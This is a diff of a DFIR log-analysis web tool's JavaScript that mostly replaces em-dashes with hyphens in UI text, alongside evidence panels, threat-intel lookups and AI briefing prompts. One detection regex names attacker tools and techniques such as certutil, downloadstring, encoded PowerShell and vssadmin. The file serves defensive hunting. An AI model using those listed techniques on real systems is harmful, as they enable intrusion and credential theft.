-    ? '<div style="overflow:auto"><table class="wlhits"><thead><tr><th>Type</th><th>Indicator</th><th>Seen</th><th>Hosts</th><th>First → last</th><th>Reputation</th><th></th></tr></thead><tbody>'+rows2+'</tbody></table></div>'+(capped?'<div class="hint" style="padding:8px 14px">Showing the first 8000 — narrow with search.</div>':'')
-    : '<div class="hint" style="padding:16px">No '+wlObsType+'s observed in this case'+(wlObsType==="ip"&&wlObsExtOnly?' (external only — toggle it off to include internal IPs).':'.')+'</div>';
+    ? '<div style="overflow:auto"><table class="wlhits"><thead><tr><th>Type</th><th>Indicator</th><th>Seen</th><th>Hosts</th><th>First → last</th><th>Reputation</th><th></th></tr></thead><tbody>'+rows2+'</tbody></table></div>'+(capped?'<div class="hint" style="padding:8px 14px">Showing the first 8000 - narrow with search.</div>':'')
+    : '<div class="hint" style="padding:16px">No '+wlObsType+'s observed in this case'+(wlObsType==="ip"&&wlObsExtOnly?' (external only - toggle it off to include internal IPs).':'.')+'</div>';
   const note = checkable&&!canCheck ? '<p class="hint" style="margin:0 0 10px">Add a VirusTotal / AbuseIPDB key in <b>⚙ Settings</b> to check these against threat intel.</p>' : '';
   w.innerHTML=wlModeBar()+bar+note+'<div class="wlpanel" style="padding:0;overflow:hidden">'+table+'</div>';
 }
@@ -7203,7 +7204,7 @@ async function checkAllObserved(btn){
     if(done<list.length) await new Promise(r=>setTimeout(r,1200));
   }
   btn.disabled=false; btn.textContent="🔎 Check all shown";
-  if(rate.n>=3) alert("Stopped — the provider is rate-limiting (free-tier quota). Wait a bit or check indicators individually. Cached results are reused for 24h.");
+  if(rate.n>=3) alert("Stopped - the provider is rate-limiting (free-tier quota). Wait a bit or check indicators individually. Cached results are reused for 24h.");
 }
 function paintManual(){
   const w=$("wlWrap");
@@ -7211,11 +7212,11 @@ function paintManual(){
   const typeChips=Object.keys(byType).sort().map(t=>'<span class="ioct '+t+'">'+t+' '+byType[t]+'</span>').join(" ");
   let items="";
   for(const it of wlIocs){ items+='<div class="wlitem"><span class="ioct '+esc(it.type)+'">'+esc(it.type)+'</span>'+
-    '<span class="wlv" title="'+esc(it.value)+(it.label?" — "+esc(it.label):"")+'">'+esc(it.value)+'</span>'+
+    '<span class="wlv" title="'+esc(it.value)+(it.label?" - "+esc(it.label):"")+'">'+esc(it.value)+'</span>'+
     '<span class="wlx" data-wlrm="'+esc(it.value)+'" title="remove">✕</span></div>'; }
   if(!items) items='<div class="hint">No indicators yet. Paste some above and click Add.</div>';
   const mgmt='<div class="wlpanel"><h3>Indicators <span style="color:var(--txt-dim);font-weight:400">('+wlIocs.length+')</span></h3>'+
-    '<p class="hint">One IOC per line — IPs, domains, hashes (md5/sha1/sha256), filenames/paths, or usernames. '+
+    '<p class="hint">One IOC per line - IPs, domains, hashes (md5/sha1/sha256), filenames/paths, or usernames. '+
     'Type is auto-detected; force it with <code>user:jdoe</code>. Add a note with <code>value, my note</code>. Reused across cases.</p>'+
     '<textarea id="wlInput" placeholder="203.0.113.9&#10;evil.example.com&#10;44d88612fea8a8f36de82e1278abb02f&#10;beacon.exe&#10;user:svc-backup, suspected compromised"></textarea>'+
     '<div class="wlacts"><button class="vbtn" data-wl="add">＋ Add indicators</button>'+
@@ -7305,15 +7306,15 @@ $("wlWrap").addEventListener("change",async e=>{
 /* ---------- rarity / stacking (long-tail hunting) ---------- */
 let rarData=null, rarView="processes", rarRareOnly=false, rarQ="";
 const RAR_VIEWS=[
-  { k:"processes",  label:"Processes",     desc:"Distinct process images, rarest first. A binary seen once across the case is the classic outlier — look for odd paths (Temp, ProgramData) and unfamiliar names." },
-  { k:"parentChild",label:"Parent → Child",desc:"Process-ancestry pairs. Rare or flagged combinations expose abnormal execution — e.g. an Office or web-server process spawning a shell (highlighted)." },
+  { k:"processes",  label:"Processes",     desc:"Distinct process images, rarest first. A binary seen once across the case is the classic outlier - look for odd paths (Temp, ProgramData) and unfamiliar names." },
+  { k:"parentChild",label:"Parent → Child",desc:"Process-ancestry pairs. Rare or flagged combinations expose abnormal execution - e.g. an Office or web-server process spawning a shell (highlighted)." },
   { k:"logons",     label:"Logon origins", desc:"Distinct user × host × logon-type × source. A rare origin is an account authenticating from somewhere it normally doesn't." },
   { k:"services",   label:"Services",      desc:"Installed services (7045 / 4697). New/rare service names and Temp-path binaries are common persistence." },
-  { k:"hashes",     label:"File hashes",   desc:"Distinct executable hashes (Sysmon EID 1), rarest first. Click 🔎 VT to check a binary against VirusTotal — confirm whether an .exe is known malware or clean." },
+  { k:"hashes",     label:"File hashes",   desc:"Distinct executable hashes (Sysmon EID 1), rarest first. Click 🔎 VT to check a binary against VirusTotal - confirm whether an .exe is known malware or clean." },
 ];
 async function renderRarity(){
   const w=$("rarWrap");
-  if(!SERVER){ w.innerHTML=ptNote("Rarity analysis runs server-side — run the backend to use this view."); return; }
+  if(!SERVER){ w.innerHTML=ptNote("Rarity analysis runs server-side - run the backend to use this view."); return; }
   if(rarData===null){ w.innerHTML=ptNote("Computing frequency stacks across the case…");
     try{ rarData=await (await api("/api/rarity")).json(); }catch(err){ w.innerHTML='<div class="dash-note err">'+esc(err.message||err)+'</div>'; return; } }
   if(wlSettings===null){ try{ wlSettings=await (await api("/api/settings")).json(); }catch{ wlSettings={}; } }
@@ -7382,7 +7383,7 @@ function paintRarity(){
       '</tr>';
   }
   const table='<div style="overflow:auto"><table class="wlhits"><thead><tr><th>Count</th><th>'+esc(meta.label)+'</th><th>Hosts</th><th>First → last seen</th><th></th></tr></thead><tbody>'+rows2+'</tbody></table></div>'+
-    (list.length>RENDER?'<div class="hint" style="padding:8px 14px">Showing the first '+RENDER.toLocaleString()+' of '+list.length.toLocaleString()+' — narrow with search or Rare only.</div>':'');
+    (list.length>RENDER?'<div class="hint" style="padding:8px 14px">Showing the first '+RENDER.toLocaleString()+' of '+list.length.toLocaleString()+' - narrow with search or Rare only.</div>':'');
   w.innerHTML=bar+'<p class="rarbar-desc">'+esc(meta.desc)+'</p><div class="wlpanel" style="padding:0;overflow:hidden">'+table+'</div>';
 }
 let _rarSearchT=null;
@@ -7401,7 +7402,7 @@ async function rarCheckAllHashes(btn){
     if(j&&j.errors&&j.errors.some(e=>/429|rate|quota/i.test(e))){ if(++rate>=3) break; } else rate=0;
     if(done<list.length) await new Promise(x=>setTimeout(x,1200)); }
   btn.disabled=false; btn.textContent="🔎 Check all shown";
-  if(rate>=3) alert("Stopped — VirusTotal is rate-limiting (free-tier quota). Wait a bit or check hashes individually; results cache for 24h.");
+  if(rate>=3) alert("Stopped - VirusTotal is rate-limiting (free-tier quota). Wait a bit or check hashes individually; results cache for 24h.");
 }
 $("rarWrap").addEventListener("click",e=>{
   const rv=e.target.closest("[data-rarview]"); if(rv){ rarView=rv.getAttribute("data-rarview"); paintRarity(); return; }
@@ -7431,9 +7432,9 @@ function renderAnnot(idx){
   box.style.display="block";
   const a=annotations.get(idx)||{ verdict:"", tags:[], note:"" };
   let vb=""; for(const k in VERDICT_LABELS){ vb+='<button class="vpick '+k+(a.verdict===k?" on":"")+'" data-verdict="'+k+'">'+VERDICT_LABELS[k]+'</button>'; }
-  box.innerHTML='<div class="anh">Analyst verdict — event #'+idx+'</div>'+
+  box.innerHTML='<div class="anh">Analyst verdict - event #'+idx+'</div>'+
     '<div class="vbtns">'+vb+'</div>'+
-    '<input id="annTags" placeholder="tags (comma-separated) — e.g. lateral-movement, host:WS01" value="'+esc((a.tags||[]).join(", "))+'">'+
+    '<input id="annTags" placeholder="tags (comma-separated) - e.g. lateral-movement, host:WS01" value="'+esc((a.tags||[]).join(", "))+'">'+
     '<textarea id="annNote" placeholder="analyst note for this event…">'+esc(a.note||"")+'</textarea>'+
     '<div class="anrow"><button class="vbtn" id="annSave">Save note</button>'+
       ((a.verdict||a.note||(a.tags&&a.tags.length))?'<button class="vbtn" id="annClear">Clear</button>':'')+
@@ -7464,7 +7465,7 @@ $("modalAnnot").addEventListener("click",async e=>{
 /* --- Case Notes tab --- */
 async function renderCasework(){
   const w=$("cwWrap");
-  if(!SERVER){ w.innerHTML=ptNote("Case notes run server-side — run the backend to use this view."); return; }
+  if(!SERVER){ w.innerHTML=ptNote("Case notes run server-side - run the backend to use this view."); return; }
   try{ const j=await (await api("/api/casework")).json(); casework=j.casework||casework;
     annotations=new Map(); for(const k in (casework.annotations||{})) annotations.set(+k, casework.annotations[k]);
   }catch(_){}
@@ -7476,7 +7477,7 @@ function paintCasework(){
     fh+='<div class="find-item"><div class="fi-h"><span class="sev" style="background:'+numColor(sevNum(f.severity))+'"></span>'+
       '<span class="fi-t">'+esc(f.title)+'</span><span class="lvl">'+esc(f.severity)+'</span><span class="find-x" data-findrm="'+esc(f.id)+'" title="remove">✕</span></div>'+
       (f.note?'<div class="fi-note">'+esc(f.note)+'</div>':'')+'</div>'; }
-  if(!fh) fh='<div class="hint">No findings yet — add your key conclusions above.</div>';
+  if(!fh) fh='<div class="hint">No findings yet - add your key conclusions above.</div>';
   const anns=[...annotations.entries()].sort((a,b)=>a[0]-b[0]);
   let ah=""; for(const [idx,a] of anns){
     ah+='<tr data-cwopen="'+idx+'"><td><span class="vchip '+esc(a.verdict||"reviewed")+'">'+esc(VERDICT_LABELS[a.verdict]||a.verdict||"noted")+'</span></td>'+
@@ -7485,17 +7486,17 @@ function paintCasework(){
       '<td class="mono" style="font-size:11px;color:var(--txt-dim)">'+esc(a.note||"")+'</td></tr>'; }
   const annTable = anns.length
     ? '<div style="overflow:auto"><table class="wlhits"><thead><tr><th>Verdict</th><th>Event</th><th>Tags</th><th>Note</th></tr></thead><tbody>'+ah+'</tbody></table></div>'
-    : '<div class="hint">No event verdicts yet. Open any event (grid, detections, timeline…) and set a verdict — they collect here and export into the IR report.</div>';
+    : '<div class="hint">No event verdicts yet. Open any event (grid, detections, timeline…) and set a verdict - they collect here and export into the IR report.</div>';
   const sevOpts=["critical","high","medium","low","info"].map(s=>'<option value="'+s+'"'+(s==="medium"?" selected":"")+'>'+s+'</option>').join("");
   w.innerHTML=
     '<div class="wlgrid" style="grid-template-columns:1fr 1fr">'+
       '<div class="wlpanel"><h3>Case summary / narrative</h3>'+
-        '<p class="hint">Your incident narrative — exported as the analyst summary in the IR report.</p>'+
+        '<p class="hint">Your incident narrative - exported as the analyst summary in the IR report.</p>'+
         '<textarea id="cwSummary" placeholder="What happened, scope, timeline, key evidence, conclusions…">'+esc(casework.summary||"")+'</textarea>'+
         '<div class="anrow" style="margin-top:8px"><button class="vbtn" id="cwSaveSummary">Save summary</button>'+
           '<button class="vbtn" id="cwAI" title="Draft a concise summary with AI Support">✦ AI draft</button><span class="anmsg" id="cwSumMsg"></span></div></div>'+
       '<div class="wlpanel"><h3>Findings</h3>'+
-        '<input id="findTitle" placeholder="finding title — e.g. Webshell dropped on WS01" style="width:100%;box-sizing:border-box;margin-bottom:6px;font:inherit;font-size:12.5px;padding:7px 8px;border:1px solid var(--line-2);border-radius:6px;background:var(--bg-2);color:var(--txt)">'+
+        '<input id="findTitle" placeholder="finding title - e.g. Webshell dropped on WS01" style="width:100%;box-sizing:border-box;margin-bottom:6px;font:inherit;font-size:12.5px;padding:7px 8px;border:1px solid var(--line-2);border-radius:6px;background:var(--bg-2);color:var(--txt)">'+
         '<div class="anrow" style="margin-bottom:6px"><select id="findSev" class="btn">'+sevOpts+'</select><button class="vbtn" id="findAdd">＋ Add finding</button></div>'+
         '<textarea id="findNote" placeholder="finding details (optional)" style="width:100%;box-sizing:border-box;min-height:52px;font-family:var(--mono);font-size:12px;padding:7px 8px;border:1px solid var(--line-2);border-radius:6px;background:var(--bg-2);color:var(--txt);margin-bottom:10px;resize:vertical"></textarea>'+
         '<div id="findList">'+fh+'</div></div>'+
@@ -7506,7 +7507,7 @@ async function aiDraftSummary(btn){
   await ensureAISettings();
   if(!aiConfigured()){ openSettings(); return; }
   const old=btn.textContent; btn.disabled=true; btn.textContent="Drafting…";
-  const sys="You are a senior DFIR analyst. Write a clear, concise incident summary (5–8 sentences, plain prose, no markdown headers) for a case report: what happened, scope (hosts/users), key evidence, and an assessment. Only use the data provided.";
+  const sys="You are a senior DFIR analyst. Write a clear, concise incident summary (5-8 sentences, plain prose, no markdown headers) for a case report: what happened, scope (hosts/users), key evidence, and an assessment. Only use the data provided.";
   const r=await callAI(sys, "Case data:\n\n"+(await gatherCaseContext())+"\n\nWrite the incident summary.", 700);
   btn.disabled=false; btn.textContent=old;
   const m=$("cwSumMsg");
@@ -7583,7 +7584,7 @@ function renderAISettings(){
   const def=(j.aiDefaults&&j.aiDefaults[aiSelProv])||"";
   $("aiModelInp").value = (aiSelProv===j.aiProvider && j.aiModel) ? j.aiModel : def;
   $("aiModelInp").placeholder=def;
-  $("aiKeyInp").value=""; $("aiKeyInp").placeholder=conf[aiSelProv]?"key already set — paste to replace":("paste "+AI_PROV_LABEL[aiSelProv]+" API key");
+  $("aiKeyInp").value=""; $("aiKeyInp").placeholder=conf[aiSelProv]?"key already set - paste to replace":("paste "+AI_PROV_LABEL[aiSelProv]+" API key");
   $("aiKeyHint").innerHTML=AI_KEY_HINTS[aiSelProv]||"";
 }
 async function openSettings(){
@@ -7601,7 +7602,7 @@ $("aiSaveBtn").onclick=async()=>{
   const key=$("aiKeyInp").value.trim(); if(key) body[aiSelProv+"ApiKey"]=key;
   $("aiSaveMsg").textContent="Saving…";
   try{ aiSettings=await (await api("/api/settings",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)})).json();
-    renderAISettings(); $("aiSaveMsg").textContent="Saved ✓ — active: "+AI_PROV_LABEL[aiSettings.aiProvider]+" · "+aiSettings.aiModel;
+    renderAISettings(); $("aiSaveMsg").textContent="Saved ✓ - active: "+AI_PROV_LABEL[aiSettings.aiProvider]+" · "+aiSettings.aiModel;
   }catch(err){ $("aiSaveMsg").textContent="Save failed: "+(err.message||err); }
 };
 $("settingsBtn").onclick=openSettings;
@@ -7802,7 +7803,7 @@ function evReasons(r){ if(!r)return ""; return Object.entries(r).sort((a,b)=>b[1
   return '<span class="ev-tag '+cls+'" title="'+esc(k)+' (×'+c+')">'+esc(k)+' ×'+c+'</span>'; }).join(" "); }
 function topMap(m,n){ return [...m.entries()].sort((a,b)=>(b[1].count||b[1])-(a[1].count||a[1])).slice(0,n); }
 const LOGON_TYPE={"2":"Interactive","3":"Network","4":"Batch","5":"Service","7":"Unlock","8":"NetworkCleartext","9":"NewCredentials","10":"RemoteInteractive (RDP)","11":"CachedInteractive"};
-function fmtDur(ms){ if(ms==null)return "—"; if(ms<0)return "?"; const m=ms/60000;
+function fmtDur(ms){ if(ms==null)return "-"; if(ms<0)return "?"; const m=ms/60000;
   if(m<1)return "<1m"; if(m<60)return Math.round(m)+"m"; if(m<1440)return (m/60).toFixed(1)+"h"; return (m/1440).toFixed(1)+"d"; }
 // decode a PowerShell -EncodedCommand base64 blob (UTF-16LE, falling back to UTF-8)
 function decodePwshEnc(cmd){
@@ -7835,7 +7836,7 @@ function renderEvidence(){
   if(!EVID || (!rows.length && !SCROLL)){ w.innerHTML='<div class="empty-dash">Load events to extract evidence.</div>'; return; }
   const E=EVID; const CAP=120;
   const susp=/powershell|cmd\.exe|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|psexec|-enc|encodedcommand|downloadstring|invoke-|frombase64|vssadmin|bcdedit|nltest|whoami|net\s+user|net\s+localgroup|schtasks|reg\s+add/i;
-  let h='<div class="dash-note">Forensic artifacts mined from <b>'+gridEventTotal().toLocaleString()+'</b> events — independent of rule hits. Click any row to pivot into the Events grid.</div>';
+  let h='<div class="dash-note">Forensic artifacts mined from <b>'+gridEventTotal().toLocaleString()+'</b> events - independent of rule hits. Click any row to pivot into the Events grid.</div>';
   // summary cards
   h+='<div class="cards">'+
      statCard(E.lsassAccess.length.toLocaleString(),"LSASS access",E.lsassAccess.length?"bad":"")+
@@ -7914,19 +7915,19 @@ function renderEvidence(){
      E.defender.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{t:x.eid},{t:x.threat}],"",x.eid)));
   // credential access / lateral
   // ---- high-signal threat hunting (rendered near the top of credential-access section) ----
-  h+=evPanel("LSASS access — possible credential dumping (Sysmon 10, process dumps, handle access)",E.lsassAccess.length,["Time","Source / process","Access","User"],
+  h+=evPanel("LSASS access - possible credential dumping (Sysmon 10, process dumps, handle access)",E.lsassAccess.length,["Time","Source / process","Access","User"],
      E.lsassAccess.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{t:x.src,cls:"ev-trunc",title:x.src},{html:'<span class="ev-tag bad">'+esc(x.ga)+'</span>'+(x.via?' <span class="ev-tag">'+esc(x.via)+'</span>':'')},{t:x.user}],x.src)),"alert");
-  h+=evPanel("CreateRemoteThread — injection (Sysmon 8)",E.remoteThread.length,["Time","Source","Target","Start"],
+  h+=evPanel("CreateRemoteThread - injection (Sysmon 8)",E.remoteThread.length,["Time","Source","Target","Start"],
      E.remoteThread.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{t:x.src,cls:"ev-trunc",title:x.src},{t:x.tgt,cls:"ev-trunc",title:x.tgt},{t:x.start,cls:"ev-trunc",title:x.start}],x.tgt)),E.remoteThread.length?"alert":"");
   h+=evPanel("Process tampering (Sysmon 25)",E.procTamper.length,["Time","Image","Type"],
      E.procTamper.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{t:x.img,cls:"ev-trunc",title:x.img},{html:'<span class="ev-tag warn">'+esc(x.type)+'</span>'}],x.img)),E.procTamper.length?"alert":"");
   h+=evPanel("Raw disk access (Sysmon 9)",E.rawAccess.length,["Time","Image","Device"],
      E.rawAccess.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{t:x.img,cls:"ev-trunc",title:x.img},{t:x.dev,cls:"ev-trunc",title:x.dev}],x.img)));
   const pipes=E.namedPipes||[]; const suspPipes=pipes.filter(p=>p.susp);
-  h+=evPanel("Named pipes — PsExec / C2 (Sysmon 17/18)",pipes.length,["Time","Pipe","Process","Act"],
+  h+=evPanel("Named pipes - PsExec / C2 (Sysmon 17/18)",pipes.length,["Time","Pipe","Process","Act"],
      [...suspPipes,...pipes.filter(p=>!p.susp)].slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{html:(x.susp?'<span class="ev-tag bad">tool</span> ':'')+esc(x.pipe)},{t:x.image,cls:"ev-trunc",title:x.image},{t:x.act}],x.pipe)),suspPipes.length?"alert":"");
   const dels=E.fileDeletes||[];
-  h+=evPanel("File deletions — anti-forensics (Sysmon 23/26)",dels.length,["Time","Deleted file","Process"],
+  h+=evPanel("File deletions - anti-forensics (Sysmon 23/26)",dels.length,["Time","Deleted file","Process"],
      dels.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{t:x.file,cls:"ev-trunc",title:x.file},{t:x.image,cls:"ev-trunc",title:x.image}],x.file)),dels.length?"alert":"");
   h+=evPanel("Application control blocks (AppLocker / WDAC)",E.appBlocks.length,["Time","Action","Source","File"],
      E.appBlocks.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{html:x.kind==="blocked"?'<span class="ev-tag bad">blocked</span>':'<span class="ev-tag warn">audit</span>'},{t:x.src},{t:x.file,cls:"ev-trunc",title:x.file}],x.file)));
@@ -7944,7 +7945,7 @@ function renderEvidence(){
      E.auditChanges.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{t:x.by},{t:x.cat,cls:"ev-trunc",title:x.cat}],"","4719")));
   h+=evPanel("BITS transfers",E.bits.length,["Time","URL","Local file"],
      E.bits.slice(0,CAP).map(x=>evRow([{t:x.ts,cls:"ev-trunc"},{t:x.url,cls:"ev-trunc",title:x.url},{t:x.file,cls:"ev-trunc",title:x.file}],x.url)));
-  // IOC rollup — with one-click threat-intel (VirusTotal / AbuseIPDB) when a key is configured
+  // IOC rollup - with one-click threat-intel (VirusTotal / AbuseIPDB) when a key is configured
   const canIp=!!(wlSettings&&(wlSettings.virustotalConfigured||wlSettings.abuseipdbConfigured));
   const canHash=!!(wlSettings&&wlSettings.virustotalConfigured);
   const repCell=(val,type)=>{ const key=String(val).toLowerCase();
@@ -7957,7 +7958,7 @@ function renderEvidence(){
   h+='</div>';
   // nothing-found note
   if(!E.accountsCreated.length&&!E.procs.length&&!E.services.length&&!E.extLogons.size&&!E.netConns.size&&!E.psBlocks.length)
-    h+='<div class="dash-note">No high-value artifacts extracted. This log may be a single channel (e.g. only Security) — load Sysmon / PowerShell / System logs too for richer evidence.</div>';
+    h+='<div class="dash-note">No high-value artifacts extracted. This log may be a single channel (e.g. only Security) - load Sysmon / PowerShell / System logs too for richer evidence.</div>';
   w.innerHTML=h;
 }
 $("evWrap").addEventListener("click",e=>{
@@ -8028,7 +8029,7 @@ async function fetchSigmaFolder(prefix,label){
     if(!tr.ok)throw new Error("HTTP "+tr.status);
     tree=(await tr.json()).tree||[];
   }catch(err){ setRulesStatus('<span class="err">Could not list folder: '+esc(err.message)+
-    '. In the in-chat preview external requests may be blocked — download the file and run it locally.</span>'); return; }
+    '. In the in-chat preview external requests may be blocked - download the file and run it locally.</span>'); return; }
   let paths=tree.filter(t=>t.type==="blob"&&t.path.indexOf(prefix)===0&&/\.ya?ml$/i.test(t.path)).map(t=>t.path);
   if(!paths.length){ setRulesStatus("No .yml rules found under "+esc(prefix)+"."); return; }
   const CAP=300; const truncated=paths.length>CAP; if(truncated)paths=paths.slice(0,CAP);
@@ -8071,7 +8072,7 @@ $("clearRulesBtn").onclick=async()=>{
 document.addEventListener("click",e=>{ if(!e.target.closest(".pop-wrap")) $("rulesPop").classList.remove("open"); });
 
 /* online-by-default: pull a curated set of well-known SigmaHQ rules (high/critical)
-   straight from GitHub raw on first load. Nothing is bundled — rules are fetched live. */
+   straight from GitHub raw on first load. Nothing is bundled - rules are fetched live. */
 let defaultRulesTried=false;
 const SIGMA_RAW_BASE="https://raw.githubusercontent.com/"+SIGMA_REPO+"/"+SIGMA_BRANCH+"/";
 async function loadDefaultRulesOnline(auto){
@@ -8085,7 +8086,7 @@ async function loadDefaultRulesOnline(auto){
   const urls=paths.map(p=>SIGMA_RAW_BASE+p);
   let got=0;
   const texts=await fetchAllRaw(urls,(d,t)=>{ got=d; if((d&8)===0||d===t)setRulesStatus('<span class="spin"></span> fetched '+d+' / '+t+' rules…'); });
-  if(!texts.length){ setRulesStatus('<span class="err">Could not fetch rules online. Check your connection — if you opened this file locally, GitHub raw must be reachable. You can still paste rules or rely on heuristics.</span>'); return; }
+  if(!texts.length){ setRulesStatus('<span class="err">Could not fetch rules online. Check your connection - if you opened this file locally, GitHub raw must be reachable. You can still paste rules or rely on heuristics.</span>'); return; }
   const added=addSigmaText(texts.join("\n---\n"),"SigmaHQ online");
   if(added)runDetections();
 }
@@ -8155,10 +8156,10 @@ async function callAI(system, prompt, maxTokens){
 function aiDetText(){
   const S=serverDet; if(!S||!S.summary) return "No server detections computed yet.";
   const sm=S.summary||{}, bySev=S.bySev||{};
-  let t="Detections: "+(sm.total||0)+" across "+(sm.withDetections||0)+" events. Severity — "+
+  let t="Detections: "+(sm.total||0)+" across "+(sm.withDetections||0)+" events. Severity - "+
     ["critical","high","medium","low","info"].map(k=>k+":"+(bySev[k]||0)).join(", ")+".";
   if(S.byRule&&S.byRule.length){ t+="\nTop detections:\n"+S.byRule.slice(0,15).map(g=>"- ["+g.level+"] "+g.title+" ×"+g.count+" ("+g.source+")").join("\n"); }
-  if(S.chains&&S.chains.length){ t+="\nCorrelated attack chains:\n"+S.chains.slice(0,6).map(c=>"- "+c.name+" on "+c.host+(c.users&&c.users.length?" (user "+c.users[0]+")":"")+" — "+c.count+" detections").join("\n"); }
+  if(S.chains&&S.chains.length){ t+="\nCorrelated attack chains:\n"+S.chains.slice(0,6).map(c=>"- "+c.name+" on "+c.host+(c.users&&c.users.length?" (user "+c.users[0]+")":"")+" - "+c.count+" detections").join("\n"); }
   if(S.attack&&S.attack.techniques&&S.attack.techniques.length){ t+="\nATT&CK techniques: "+S.attack.techniques.slice(0,15).map(x=>x.id+(x.name?" "+x.name:"")).join(", "); }
   if(S.entities&&S.entities.length){ t+="\nHighest-risk entities: "+S.entities.slice(0,8).map(e=>e.type+":"+e.name+"(score "+e.score+")").join(", "); }
   return t;
@@ -8188,12 +8189,12 @@ async function gatherCaseContext(){
   if(anns.length) parts.push("Analyst verdicts so far: "+anns.map(a=>VERDICT_LABELS[a.verdict]||a.verdict).join(", ")+".");
   return parts.join("\n");
 }
-const AI_BASE="You are a lead DFIR/SOC analyst. Write a detailed but skimmable analyst briefing — thorough and genuinely useful, never a one-liner. "+
+const AI_BASE="You are a lead DFIR/SOC analyst. Write a detailed but skimmable analyst briefing - thorough and genuinely useful, never a one-liner. "+
   "Use markdown '## ' headers for the sections listed below, in that exact order, with 2-5 bullets under each. "+
   "Be specific and CITE the data (exact counts, and real host / user / IP / file names). "+
-  "NEVER invent values — if a section has no supporting evidence, say so explicitly and state what data would answer it. Use **bold** for key terms. No filler.";
+  "NEVER invent values - if a section has no supporting evidence, say so explicitly and state what data would answer it. Use **bold** for key terms. No filler.";
 function aiStruct(sections){ return AI_BASE+"\n\nSections (use these exact '## ' headers, in order):\n"+sections.map(s=>"## "+s).join("\n")+
-  "\n\nCover EVERY section through to the last one — keep each to 2-4 tight bullets so the whole briefing fits. Never stop mid-section or mid-sentence."; }
+  "\n\nCover EVERY section through to the last one - keep each to 2-4 tight bullets so the whole briefing fits. Never stop mid-section or mid-sentence."; }
 async function aiProcText(){
   let j=procTreeData; if(!j){ try{ j=await (await api("/api/proctree")).json(); }catch(_){} }
   if(!j||!j.roots||!j.roots.length) return "No Sysmon process trees (EID 1) present in this case.";
@@ -8202,7 +8203,7 @@ async function aiProcText(){
     if(node.det||node.subDet){ lines.push("  ".repeat(Math.min(depth,6))+ptBase(node.image||"?")+(node.user?" ("+node.user+")":"")+(node.det?" [DETECTION]":"")+(node.cmd&&node.cmd!==node.image?" :: "+String(node.cmd).slice(0,140):"")); n++; }
     for(const c of (node.children||[])) walk(c,depth+1); };
   for(const r of j.roots) walk(r,0);
-  return "Process trees: "+j.count+" processes across "+((j.hosts&&j.hosts.length)||1)+" host(s). Ancestry branches that involve a detection:\n"+(lines.join("\n")||"(no detected branches — comment on overall structure)");
+  return "Process trees: "+j.count+" processes across "+((j.hosts&&j.hosts.length)||1)+" host(s). Ancestry branches that involve a detection:\n"+(lines.join("\n")||"(no detected branches - comment on overall structure)");
 }
 async function aiSessText(){
   let s=sessData; if(!s){ try{ s=(await (await api("/api/sessions")).json()).sessions; }catch(_){} }
@@ -8226,50 +8227,50 @@ async function aiEvidenceText(){
   return t;
 }
 async function aiSectionContext(mode){
-  if(mode==="det") return { title:"Detections — analyst read", maxTokens:2800,
+  if(mode==="det") return { title:"Detections - analyst read", maxTokens:2800,
     system:aiStruct(["Bottom line","Most urgent detections (triage order)","What the attacker is doing (map to ATT&CK)","Correlated attack chains","Likely false positives","Next checks","Open questions to answer"]),
     prompt:"Detection results:\n\n"+aiDetText()+"\n\nWrite the detections briefing." };
-  if(mode==="rar"){ let d="No rarity data loaded — open the Rarity tab first."; if(rarData){ const pick=s=>s&&s.rows?s.rows.filter(r=>r.rare||r.suspicious).slice(0,15).map(r=>"x"+r.count+(r.suspicious?" [SUSPICIOUS]":"")+(r.det?" [on detection]":"")+" "+r.value):[];
+  if(mode==="rar"){ let d="No rarity data loaded - open the Rarity tab first."; if(rarData){ const pick=s=>s&&s.rows?s.rows.filter(r=>r.rare||r.suspicious).slice(0,15).map(r=>"x"+r.count+(r.suspicious?" [SUSPICIOUS]":"")+(r.det?" [on detection]":"")+" "+r.value):[];
       d="Rare/suspicious processes:\n"+pick(rarData.processes).join("\n")+"\nRare parent→child ancestry:\n"+pick(rarData.parentChild).join("\n")+"\nRare logon origins:\n"+pick(rarData.logons).join("\n")+"\nRare services:\n"+pick(rarData.services).join("\n"); }
-    return { title:"Rarity — hunt leads", maxTokens:2600,
+    return { title:"Rarity - hunt leads", maxTokens:2600,
       system:aiStruct(["Bottom line","Top anomalies to investigate first","Suspicious process ancestry","Anomalous logons","Persistence / services","Recommended pivots","Open questions to answer"]),
       prompt:"Long-tail (rare) values from the case:\n\n"+d+"\n\nWrite the hunting briefing." }; }
   if(mode==="wl"){ let d="Open the Watchlist tab first."; if(wlObserved){ const top=a=>(a||[]).slice(0,25).map(x=>x.value+" x"+x.count+(x.det?" [on detection]":"")).join(", ");
       d="Observed IPs: "+top(wlObserved.ips)+"\nObserved hashes: "+top(wlObserved.hashes)+"\nObserved domains: "+top(wlObserved.domains); }
-    return { title:"Indicators — assessment", maxTokens:2400,
+    return { title:"Indicators - assessment", maxTokens:2400,
       system:aiStruct(["Bottom line","Suspicious IPs (and why)","Suspicious hashes / domains","Recommended reputation checks","Pivot suggestions","Open questions to answer"]),
       prompt:"Indicators observed in this case:\n\n"+d+"\n\nWrite the indicator assessment." }; }
   if(mode==="lat"){ let d="Open the Lateral tab first."; if(latData&&latData.edges){ d="Lateral-movement edges (source → target [techniques]):\n"+latData.edges.slice(0,40).map(e=>e.from+" → "+e.to+" ["+Object.keys(e.kinds||{}).join(",")+"]"+(e.users&&e.users.length?" users:"+e.users.slice(0,3).join(","):"")+(e.det>0?" [on detection]":"")).join("\n"); }
-    return { title:"Lateral movement — read", maxTokens:2600,
+    return { title:"Lateral movement - read", maxTokens:2600,
       system:aiStruct(["Bottom line","Likely pivot path (chronological)","Patient-zero / entry point","High-value targets touched","Compromised credentials in play","Containment priorities","Open questions to answer"]),
       prompt:"Cross-host movement in this case:\n\n"+d+"\n\nWrite the lateral-movement briefing." }; }
